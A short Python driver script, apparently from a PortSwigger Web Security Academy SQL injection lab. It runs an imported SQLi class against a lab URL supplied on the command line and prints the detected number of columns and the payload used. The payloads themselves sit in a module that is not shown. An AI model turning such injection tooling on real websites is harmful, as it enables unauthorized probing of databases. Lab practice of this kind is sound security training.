import sys
import requests
import urllib3
from methods import SQLi,path




if __name__=='__main__':
    try :
        url=sys.argv[1].strip()
        lab3=SQLi(url,path)
        print(f"[+] Number of columns is {lab3.number_of_columns}")
        print(lab3.payloads["number of columns"])
    except IndexError:
        print(f"[-] usage {sys.argv[0]} <url> ")
        print(f'[-] Example: python3 {sys.argv[0]} "https://0aca008e032011d9801b6744004c006e.web-security-academy.net"')
